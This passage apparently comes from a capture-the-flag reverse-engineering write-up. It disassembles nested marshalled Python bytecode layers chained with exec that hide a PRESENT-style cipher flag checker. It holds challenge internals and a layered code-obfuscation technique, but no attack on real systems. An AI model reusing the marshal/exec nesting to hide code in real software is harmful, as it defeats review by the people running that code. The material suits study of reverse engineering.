\x00\x00\x00g\x00|\x00]\x18&#125;\x01t\x00\x88\x00|\x01\x19\x00\x83\x01d\x00|\x01\x14\x00&gt;\x00\x91\x02q\x04S\x00)\x01\xe9\x08\x00\x00\x00)\x01\xda\x03ord)\x02\xda\x02.0\xda\x01c\xa9\x01\xda\x01i\xa9\x00\xda\x00\xda\n&lt;listcomp&gt;\x03\x00\x00\x00s\x04\x00\x00\x00\x06\x00\x02\x00z!string2number.&lt;locals&gt;.&lt;listcomp&gt;r\x00\x00\x00\x00)\x02\xda\x03sum\xda\x05ranger\x04\x00\x00\x00r\x06\x00\x00\x00r\x04\x00\x00\x00r\x07\x00\x00\x00\xda\rstring2number\x02\x00\x00\x00s\x02\x00\x00\x00\x00\x01r\x0b\x00\x00\x00s\x01\x05\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x05\x00\x00\x00C\x00\x00\x00st\x00\x00\x00g\x00&#125;\x02t\x00d\x01|\x01d\x01\x17\x00d\x01\x83\x03D\x00]Z&#125;\x03|\x02\xa0\x01|\x00d\x02?\x00\xa1\x01\x01\x00|\x00d\x03@\x00d\x04&gt;\x00|\x00d\x05?\x00\x17\x00&#125;\x00t\x02|\x00d\x06?\x00\x19\x00d\x06&gt;\x00|\x00d\x07d\x06\x13\x00d\x01\x18\x00@\x00\x17\x00&#125;\x00|\x00|\x03d\x08&gt;\x00|\x00d\x05?\x00A\x00N\x00&#125;\x00q\x14|\x02S\x00)\tN\xe9\x01\x00\x00\x00\xe9\x10\x00\x00\x00i\xff\xff\x07\x00\xe9=\x00\x00\x00\xe9\x13\x00\x00\x00\xe9L\x00\x00\x00\xe9\x02\x00\x00\x00\xe9\x0f\x00\x00\x00)\x03\xda\x05range\xda\x06appendZ\x04Sbox)\x04\xda\x03key\xda\x06roundsZ\troundkeys\xda\x01i\xa9\x00r\x0c\x00\x00\x00\xda\x00\xda\x13generateRoundkeys80\x02\x00\x00\x00s\x0e\x00\x00\x00\x00\x01\x04\x01\x14\x01\x0e\x01\x14\x01 \x01\x16\x01r\x0e\x00\x00\x00sF\x03\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00@\x00\x00\x00s\xa6\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01d\x02\x83\x01Z\x02e\x03e\x02\x83\x01d\x03k\x03r,e\x04d\x04\x83\x01\x01\x00e\x05d\x05\x83\x01\x01\x00e\x02d\x06d\x07\x85\x02\x19\x00e\x02d\x07d\x08\x85\x02\x19\x00e\x02d\x08d\t\x85\x02\x19\x00e\x02d\td\x03\x85\x02\x19\x00g\x04Z\x06d\nd\x0bd\x0cd\rg\x04Z\x07e\x00e\x06\x83\x01Z\x08e\td\x0e\x83\x01D\x00]$Z\ne\x07e\n\x19\x00e\x08e\n\x19\x00k\x03rte\x04d\x04\x83\x01\x01\x00e\x05d\x05\x83\x01\x01\x00qte\x04d\x0f\x83\x01\x01\x00d\x06S\x00)\x10c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x06\x00\x00\x00C\x00\x00\x00sp\x00\x00\x00d\x01&#125;\x01t\x00d\x02|\x01\x83\x02&#125;\x02g\x00&#125;\x03|\x00D\x00]T&#125;\x04t\x01|\x04\x83\x01&#125;\x05t\x02|\x01d\x03\x18\x00\x83\x01D\x00]&quot;&#125;\x06t\x03|\x05|\x02|\x06\x19\x00\x83\x02&#125;\x05t\x04|\x05\x83\x01&#125;\x05t\x05|\x05\x83\x01&#125;\x05q.t\x03|\x05|\x02d\x04\x19\x00\x83\x02&#125;\x07|\x03\xa0\x06|\x07\xa1\x01\x01\x00q\x16|\x03S\x00)\x05N\xe9 \x00\x00\x00l\x06\x00\x00\x00! 20\\X\xa8 1!\x02\x00\xe9\x01\x00\x00\x00\xe9\xff\xff\xff\xff)\x07Z\x13generateRoundkeys80Z\rstring2number\xda\x05rangeZ\x0baddRoundKeyZ\tsBoxLayerZ\x06pLayer\xda\x06append)\x08\xda\x06blocks\xda\x06roundsZ\troundkeysZ\x03outZ\x05block\xda\x05state\xda\x01iZ\x06cipher\xa9\x00r\t\x00\x00\x00\xda\x00\xda\x07encrypt\x02\x00\x00\x00s\x18\x00\x00\x00\x00\x01\x04\x01\n\x01\x04\x01\x08\x01\x08\x01\x10\x01\x0e\x01\x08\x01\n\x01\x0e\x01\x0c\x01r\x0b\x00\x00\x00z\x12pls input ur flag:r\x00\x00\x00\x00z\x0bwrong flag!\xe9\x00\x00\x00\x00N\xe9\x08\x00\x00\x00\xe9\x10\x00\x00\x00\xe9\x18\x00\x00\x00l\x04\x00\x00\x00\x9e\x1faH\xc4\x13d\rl\x05\x00\x00\x00b]t:\x94Z\x15\x18\x0e\x00l\x04\x00\x00\x000ek95\x04\xb2&quot;l\x05\x00\x00\x00\x88o\xeddY\x13\xb1L\x01\x00\xe9\x04\x00\x00\x00z\x08Correct!)\x0br\x0b\x00\x00\x00\xda\x05inputZ\x03inp\xda\x03len\xda\x05print\xda\x04exitr\x05\x00\x00\x00Z\x04cmpsZ\nout_blocksr\x03\x00\x00\x00r\x08\x00\x00\x00r\t\x00\x00\x00r\t\x00\x00\x00r\t\x00\x00\x00r\n\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x18\x00\x00\x00\x08\x0e\x08\x01\x0c\x01\x08\x01\x08\x01,\x01\x0c\x01\x08\x01\x0c\x01\x10\x01\x08\x01\n\x01N)\x05r\x0e\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x0c\x00\x00\x00r\x0c\x00\x00\x00r\x0c\x00\x00\x00r\r\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\t\n\x01N)\x05r\x0b\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x06\x00\x00\x00r\x06\x00\x00\x00r\x06\x00\x00\x00r\x07\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\x03\n\x01N)\x05r\t\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x07\x00\x00\x00r\x07\x00\x00\x00r\x07\x00\x00\x00r\x08\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\x06\n\x01N)\x05r\n\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x08\x00\x00\x00r\x08\x00\x00\x00r\x08\x00\x00\x00r\t\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\x06\n\x01&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(dis.dis(marshal.loads(l2)))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;====================================================================================================================================================&quot;</span>)</span><br><span class="line">l3 = <span class="string">b&#x27;c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x05\x00\x00\x00C\x00\x00\x00s.\x00\x00\x00d\x01&#125;\x01t\x00d\x02\x83\x01D\x00]\x1c&#125;\x02|\x01|\x00|\x02?\x00d\x03@\x00t\x01|\x02\x19\x00&gt;\x007\x00&#125;\x01q\x0c|\x01S\x00)\x04N\xe9\x00\x00\x00\x00\xe9@\x00\x00\x00\xe9\x01\x00\x00\x00)\x02\xda\x05rangeZ\x04PBox)\x03\xda\x05state\xda\x06output\xda\x01i\xa9\x00r\x07\x00\x00\x00\xda\x00\xda\x06pLayer\x02\x00\x00\x00s\x08\x00\x00\x00\x00\x01\x04\x01\x0c\x01\x1a\x01r\t\x00\x00\x00s\xac\x06\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x04\x00\x00\x00\x03\x00\x00\x00s\x1a\x00\x00\x00t\x00\x87\x00f\x01d\x01d\x02\x84\x08t\x01d\x03\x83\x01D\x00\x83\x01\x83\x01S\x00)\x04Nc\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x05\x00\x00\x00\x13\x00\x00\x00s \x00\x00\x00g\x00|\x00]\x18&#125;\x01t\x00\x88\x00|\x01\x19\x00\x83\x01d\x00|\x01\x14\x00&gt;\x00\x91\x02q\x04S\x00)\x01\xe9\x08\x00\x00\x00)\x01\xda\x03ord)\x02\xda\x02.0\xda\x01c\xa9\x01\xda\x01i\xa9\x00\xda\x00\xda\n&lt;listcomp&gt;\x03\x00\x00\x00s\x04\x00\x00\x00\x06\x00\x02\x00z!string2number.&lt;locals&gt;.&lt;listcomp&gt;r\x00\x00\x00\x00)\x02\xda\x03sum\xda\x05ranger\x04\x00\x00\x00r\x06\x00\x00\x00r\x04\x00\x00\x00r\x07\x00\x00\x00\xda\rstring2number\x02\x00\x00\x00s\x02\x00\x00\x00\x00\x01r\x0b\x00\x00\x00s\x01\x05\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x05\x00\x00\x00C\x00\x00\x00st\x00\x00\x00g\x00&#125;\x02t\x00d\x01|\x01d\x01\x17\x00d\x01\x83\x03D\x00]Z&#125;\x03|\x02\xa0\x01|\x00d\x02?\x00\xa1\x01\x01\x00|\x00d\x03@\x00d\x04&gt;\x00|\x00d\x05?\x00\x17\x00&#125;\x00t\x02|\x00d\x06?\x00\x19\x00d\x06&gt;\x00|\x00d\x07d\x06\x13\x00d\x01\x18\x00@\x00\x17\x00&#125;\x00|\x00|\x03d\x08&gt;\x00|\x00d\x05?\x00A\x00N\x00&#125;\x00q\x14|\x02S\x00)\tN\xe9\x01\x00\x00\x00\xe9\x10\x00\x00\x00i\xff\xff\x07\x00\xe9=\x00\x00\x00\xe9\x13\x00\x00\x00\xe9L\x00\x00\x00\xe9\x02\x00\x00\x00\xe9\x0f\x00\x00\x00)\x03\xda\x05range\xda\x06appendZ\x04Sbox)\x04\xda\x03key\xda\x06roundsZ\troundkeys\xda\x01i\xa9\x00r\x0c\x00\x00\x00\xda\x00\xda\x13generateRoundkeys80\x02\x00\x00\x00s\x0e\x00\x00\x00\x00\x01\x04\x01\x14\x01\x0e\x01\x14\x01 \x01\x16\x01r\x0e\x00\x00\x00sF\x03\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00@\x00\x00\x00s\xa6\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01d\x02\x83\x01Z\x02e\x03e\x02\x83\x01d\x03k\x03r,e\x04d\x04\x83\x01\x01\x00e\x05d\x05\x83\x01\x01\x00e\x02d\x06d\x07\x85\x02\x19\x00e\x02d\x07d\x08\x85\x02\x19\x00e\x02d\x08d\t\x85\x02\x19\x00e\x02d\td\x03\x85\x02\x19\x00g\x04Z\x06d\nd\x0bd\x0cd\rg\x04Z\x07e\x00e\x06\x83\x01Z\x08e\td\x0e\x83\x01D\x00]$Z\ne\x07e\n\x19\x00e\x08e\n\x19\x00k\x03rte\x04d\x04\x83\x01\x01\x00e\x05d\x05\x83\x01\x01\x00qte\x04d\x0f\x83\x01\x01\x00d\x06S\x00)\x10c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x06\x00\x00\x00C\x00\x00\x00sp\x00\x00\x00d\x01&#125;\x01t\x00d\x02|\x01\x83\x02&#125;\x02g\x00&#125;\x03|\x00D\x00]T&#125;\x04t\x01|\x04\x83\x01&#125;\x05t\x02|\x01d\x03\x18\x00\x83\x01D\x00]&quot;&#125;\x06t\x03|\x05|\x02|\x06\x19\x00\x83\x02&#125;\x05t\x04|\x05\x83\x01&#125;\x05t\x05|\x05\x83\x01&#125;\x05q.t\x03|\x05|\x02d\x04\x19\x00\x83\x02&#125;\x07|\x03\xa0\x06|\x07\xa1\x01\x01\x00q\x16|\x03S\x00)\x05N\xe9 \x00\x00\x00l\x06\x00\x00\x00! 20\\X\xa8 1!\x02\x00\xe9\x01\x00\x00\x00\xe9\xff\xff\xff\xff)\x07Z\x13generateRoundkeys80Z\rstring2number\xda\x05rangeZ\x0baddRoundKeyZ\tsBoxLayerZ\x06pLayer\xda\x06append)\x08\xda\x06blocks\xda\x06roundsZ\troundkeysZ\x03outZ\x05block\xda\x05state\xda\x01iZ\x06cipher\xa9\x00r\t\x00\x00\x00\xda\x00\xda\x07encrypt\x02\x00\x00\x00s\x18\x00\x00\x00\x00\x01\x04\x01\n\x01\x04\x01\x08\x01\x08\x01\x10\x01\x0e\x01\x08\x01\n\x01\x0e\x01\x0c\x01r\x0b\x00\x00\x00z\x12pls input ur flag:r\x00\x00\x00\x00z\x0bwrong flag!\xe9\x00\x00\x00\x00N\xe9\x08\x00\x00\x00\xe9\x10\x00\x00\x00\xe9\x18\x00\x00\x00l\x04\x00\x00\x00\x9e\x1faH\xc4\x13d\rl\x05\x00\x00\x00b]t:\x94Z\x15\x18\x0e\x00l\x04\x00\x00\x000ek95\x04\xb2&quot;l\x05\x00\x00\x00\x88o\xeddY\x13\xb1L\x01\x00\xe9\x04\x00\x00\x00z\x08Correct!)\x0br\x0b\x00\x00\x00\xda\x05inputZ\x03inp\xda\x03len\xda\x05print\xda\x04exitr\x05\x00\x00\x00Z\x04cmpsZ\nout_blocksr\x03\x00\x00\x00r\x08\x00\x00\x00r\t\x00\x00\x00r\t\x00\x00\x00r\t\x00\x00\x00r\n\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x18\x00\x00\x00\x08\x0e\x08\x01\x0c\x01\x08\x01\x08\x01,\x01\x0c\x01\x08\x01\x0c\x01\x10\x01\x08\x01\n\x01N)\x05r\x0e\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x0c\x00\x00\x00r\x0c\x00\x00\x00r\x0c\x00\x00\x00r\r\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\t\n\x01N)\x05r\x0b\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x06\x00\x00\x00r\x06\x00\x00\x00r\x06\x00\x00\x00r\x07\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\x03\n\x01N)\x05r\t\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x07\x00\x00\x00r\x07\x00\x00\x00r\x07\x00\x00\x00r\x08\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\x06\n\x01&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(dis.dis(marshal.loads(l3)))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;====================================================================================================================================================&quot;</span>)</span><br><span class="line">l4 = <span class="string">b&#x27;c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x04\x00\x00\x00\x03\x00\x00\x00s\x1a\x00\x00\x00t\x00\x87\x00f\x01d\x01d\x02\x84\x08t\x01d\x03\x83\x01D\x00\x83\x01\x83\x01S\x00)\x04Nc\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x05\x00\x00\x00\x13\x00\x00\x00s \x00\x00\x00g\x00|\x00]\x18&#125;\x01t\x00\x88\x00|\x01\x19\x00\x83\x01d\x00|\x01\x14\x00&gt;\x00\x91\x02q\x04S\x00)\x01\xe9\x08\x00\x00\x00)\x01\xda\x03ord)\x02\xda\x02.0\xda\x01c\xa9\x01\xda\x01i\xa9\x00\xda\x00\xda\n&lt;listcomp&gt;\x03\x00\x00\x00s\x04\x00\x00\x00\x06\x00\x02\x00z!string2number.&lt;locals&gt;.&lt;listcomp&gt;r\x00\x00\x00\x00)\x02\xda\x03sum\xda\x05ranger\x04\x00\x00\x00r\x06\x00\x00\x00r\x04\x00\x00\x00r\x07\x00\x00\x00\xda\rstring2number\x02\x00\x00\x00s\x02\x00\x00\x00\x00\x01r\x0b\x00\x00\x00s\x01\x05\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x05\x00\x00\x00C\x00\x00\x00st\x00\x00\x00g\x00&#125;\x02t\x00d\x01|\x01d\x01\x17\x00d\x01\x83\x03D\x00]Z&#125;\x03|\x02\xa0\x01|\x00d\x02?\x00\xa1\x01\x01\x00|\x00d\x03@\x00d\x04&gt;\x00|\x00d\x05?\x00\x17\x00&#125;\x00t\x02|\x00d\x06?\x00\x19\x00d\x06&gt;\x00|\x00d\x07d\x06\x13\x00d\x01\x18\x00@\x00\x17\x00&#125;\x00|\x00|\x03d\x08&gt;\x00|\x00d\x05?\x00A\x00N\x00&#125;\x00q\x14|\x02S\x00)\tN\xe9\x01\x00\x00\x00\xe9\x10\x00\x00\x00i\xff\xff\x07\x00\xe9=\x00\x00\x00\xe9\x13\x00\x00\x00\xe9L\x00\x00\x00\xe9\x02\x00\x00\x00\xe9\x0f\x00\x00\x00)\x03\xda\x05range\xda\x06appendZ\x04Sbox)\x04\xda\x03key\xda\x06roundsZ\troundkeys\xda\x01i\xa9\x00r\x0c\x00\x00\x00\xda\x00\xda\x13generateRoundkeys80\x02\x00\x00\x00s\x0e\x00\x00\x00\x00\x01\x04\x01\x14\x01\x0e\x01\x14\x01 \x01\x16\x01r\x0e\x00\x00\x00sF\x03\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00@\x00\x00\x00s\xa6\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01d\x02\x83\x01Z\x02e\x03e\x02\x83\x01d\x03k\x03r,e\x04d\x04\x83\x01\x01\x00e\x05d\x05\x83\x01\x01\x00e\x02d\x06d\x07\x85\x02\x19\x00e\x02d\x07d\x08\x85\x02\x19\x00e\x02d\x08d\t\x85\x02\x19\x00e\x02d\td\x03\x85\x02\x19\x00g\x04Z\x06d\nd\x0bd\x0cd\rg\x04Z\x07e\x00e\x06\x83\x01Z\x08e\td\x0e\x83\x01D\x00]$Z\ne\x07e\n\x19\x00e\x08e\n\x19\x00k\x03rte\x04d\x04\x83\x01\x01\x00e\x05d\x05\x83\x01\x01\x00qte\x04d\x0f\x83\x01\x01\x00d\x06S\x00)\x10c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x06\x00\x00\x00C\x00\x00\x00sp\x00\x00\x00d\x01&#125;\x01t\x00d\x02|\x01\x83\x02&#125;\x02g\x00&#125;\x03|\x00D\x00]T&#125;\x04t\x01|\x04\x83\x01&#125;\x05t\x02|\x01d\x03\x18\x00\x83\x01D\x00]&quot;&#125;\x06t\x03|\x05|\x02|\x06\x19\x00\x83\x02&#125;\x05t\x04|\x05\x83\x01&#125;\x05t\x05|\x05\x83\x01&#125;\x05q.t\x03|\x05|\x02d\x04\x19\x00\x83\x02&#125;\x07|\x03\xa0\x06|\x07\xa1\x01\x01\x00q\x16|\x03S\x00)\x05N\xe9 \x00\x00\x00l\x06\x00\x00\x00! 20\\X\xa8 1!\x02\x00\xe9\x01\x00\x00\x00\xe9\xff\xff\xff\xff)\x07Z\x13generateRoundkeys80Z\rstring2number\xda\x05rangeZ\x0baddRoundKeyZ\tsBoxLayerZ\x06pLayer\xda\x06append)\x08\xda\x06blocks\xda\x06roundsZ\troundkeysZ\x03outZ\x05block\xda\x05state\xda\x01iZ\x06cipher\xa9\x00r\t\x00\x00\x00\xda\x00\xda\x07encrypt\x02\x00\x00\x00s\x18\x00\x00\x00\x00\x01\x04\x01\n\x01\x04\x01\x08\x01\x08\x01\x10\x01\x0e\x01\x08\x01\n\x01\x0e\x01\x0c\x01r\x0b\x00\x00\x00z\x12pls input ur flag:r\x00\x00\x00\x00z\x0bwrong flag!\xe9\x00\x00\x00\x00N\xe9\x08\x00\x00\x00\xe9\x10\x00\x00\x00\xe9\x18\x00\x00\x00l\x04\x00\x00\x00\x9e\x1faH\xc4\x13d\rl\x05\x00\x00\x00b]t:\x94Z\x15\x18\x0e\x00l\x04\x00\x00\x000ek95\x04\xb2&quot;l\x05\x00\x00\x00\x88o\xeddY\x13\xb1L\x01\x00\xe9\x04\x00\x00\x00z\x08Correct!)\x0br\x0b\x00\x00\x00\xda\x05inputZ\x03inp\xda\x03len\xda\x05print\xda\x04exitr\x05\x00\x00\x00Z\x04cmpsZ\nout_blocksr\x03\x00\x00\x00r\x08\x00\x00\x00r\t\x00\x00\x00r\t\x00\x00\x00r\t\x00\x00\x00r\n\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x18\x00\x00\x00\x08\x0e\x08\x01\x0c\x01\x08\x01\x08\x01,\x01\x0c\x01\x08\x01\x0c\x01\x10\x01\x08\x01\n\x01N)\x05r\x0e\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x0c\x00\x00\x00r\x0c\x00\x00\x00r\x0c\x00\x00\x00r\r\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\t\n\x01N)\x05r\x0b\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x06\x00\x00\x00r\x06\x00\x00\x00r\x06\x00\x00\x00r\x07\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\x03\n\x01&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(dis.dis(marshal.loads(l4)))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;====================================================================================================================================================&quot;</span>)</span><br><span class="line">l5 = <span class="string">b&#x27;c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x05\x00\x00\x00C\x00\x00\x00st\x00\x00\x00g\x00&#125;\x02t\x00d\x01|\x01d\x01\x17\x00d\x01\x83\x03D\x00]Z&#125;\x03|\x02\xa0\x01|\x00d\x02?\x00\xa1\x01\x01\x00|\x00d\x03@\x00d\x04&gt;\x00|\x00d\x05?\x00\x17\x00&#125;\x00t\x02|\x00d\x06?\x00\x19\x00d\x06&gt;\x00|\x00d\x07d\x06\x13\x00d\x01\x18\x00@\x00\x17\x00&#125;\x00|\x00|\x03d\x08&gt;\x00|\x00d\x05?\x00A\x00N\x00&#125;\x00q\x14|\x02S\x00)\tN\xe9\x01\x00\x00\x00\xe9\x10\x00\x00\x00i\xff\xff\x07\x00\xe9=\x00\x00\x00\xe9\x13\x00\x00\x00\xe9L\x00\x00\x00\xe9\x02\x00\x00\x00\xe9\x0f\x00\x00\x00)\x03\xda\x05range\xda\x06appendZ\x04Sbox)\x04\xda\x03key\xda\x06roundsZ\troundkeys\xda\x01i\xa9\x00r\x0c\x00\x00\x00\xda\x00\xda\x13generateRoundkeys80\x02\x00\x00\x00s\x0e\x00\x00\x00\x00\x01\x04\x01\x14\x01\x0e\x01\x14\x01 \x01\x16\x01r\x0e\x00\x00\x00sF\x03\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00@\x00\x00\x00s\xa6\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01d\x02\x83\x01Z\x02e\x03e\x02\x83\x01d\x03k\x03r,e\x04d\x04\x83\x01\x01\x00e\x05d\x05\x83\x01\x01\x00e\x02d\x06d\x07\x85\x02\x19\x00e\x02d\x07d\x08\x85\x02\x19\x00e\x02d\x08d\t\x85\x02\x19\x00e\x02d\td\x03\x85\x02\x19\x00g\x04Z\x06d\nd\x0bd\x0cd\rg\x04Z\x07e\x00e\x06\x83\x01Z\x08e\td\x0e\x83\x01D\x00]$Z\ne\x07e\n\x19\x00e\x08e\n\x19\x00k\x03rte\x04d\x04\x83\x01\x01\x00e\x05d\x05\x83\x01\x01\x00qte\x04d\x0f\x83\x01\x01\x00d\x06S\x00)\x10c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x06\x00\x00\x00C\x00\x00\x00sp\x00\x00\x00d\x01&#125;\x01t\x00d\x02|\x01\x83\x02&#125;\x02g\x00&#125;\x03|\x00D\x00]T&#125;\x04t\x01|\x04\x83\x01&#125;\x05t\x02|\x01d\x03\x18\x00\x83\x01D\x00]&quot;&#125;\x06t\x03|\x05|\x02|\x06\x19\x00\x83\x02&#125;\x05t\x04|\x05\x83\x01&#125;\x05t\x05|\x05\x83\x01&#125;\x05q.t\x03|\x05|\x02d\x04\x19\x00\x83\x02&#125;\x07|\x03\xa0\x06|\x07\xa1\x01\x01\x00q\x16|\x03S\x00)\x05N\xe9 \x00\x00\x00l\x06\x00\x00\x00! 20\\X\xa8 1!\x02\x00\xe9\x01\x00\x00\x00\xe9\xff\xff\xff\xff)\x07Z\x13generateRoundkeys80Z\rstring2number\xda\x05rangeZ\x0baddRoundKeyZ\tsBoxLayerZ\x06pLayer\xda\x06append)\x08\xda\x06blocks\xda\x06roundsZ\troundkeysZ\x03outZ\x05block\xda\x05state\xda\x01iZ\x06cipher\xa9\x00r\t\x00\x00\x00\xda\x00\xda\x07encrypt\x02\x00\x00\x00s\x18\x00\x00\x00\x00\x01\x04\x01\n\x01\x04\x01\x08\x01\x08\x01\x10\x01\x0e\x01\x08\x01\n\x01\x0e\x01\x0c\x01r\x0b\x00\x00\x00z\x12pls input ur flag:r\x00\x00\x00\x00z\x0bwrong flag!\xe9\x00\x00\x00\x00N\xe9\x08\x00\x00\x00\xe9\x10\x00\x00\x00\xe9\x18\x00\x00\x00l\x04\x00\x00\x00\x9e\x1faH\xc4\x13d\rl\x05\x00\x00\x00b]t:\x94Z\x15\x18\x0e\x00l\x04\x00\x00\x000ek95\x04\xb2&quot;l\x05\x00\x00\x00\x88o\xeddY\x13\xb1L\x01\x00\xe9\x04\x00\x00\x00z\x08Correct!)\x0br\x0b\x00\x00\x00\xda\x05inputZ\x03inp\xda\x03len\xda\x05print\xda\x04exitr\x05\x00\x00\x00Z\x04cmpsZ\nout_blocksr\x03\x00\x00\x00r\x08\x00\x00\x00r\t\x00\x00\x00r\t\x00\x00\x00r\t\x00\x00\x00r\n\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x18\x00\x00\x00\x08\x0e\x08\x01\x0c\x01\x08\x01\x08\x01,\x01\x0c\x01\x08\x01\x0c\x01\x10\x01\x08\x01\n\x01N)\x05r\x0e\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x0c\x00\x00\x00r\x0c\x00\x00\x00r\x0c\x00\x00\x00r\r\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\t\n\x01&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(dis.dis(marshal.loads(l5)))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;====================================================================================================================================================&quot;</span>)</span><br><span class="line">l6 = <span 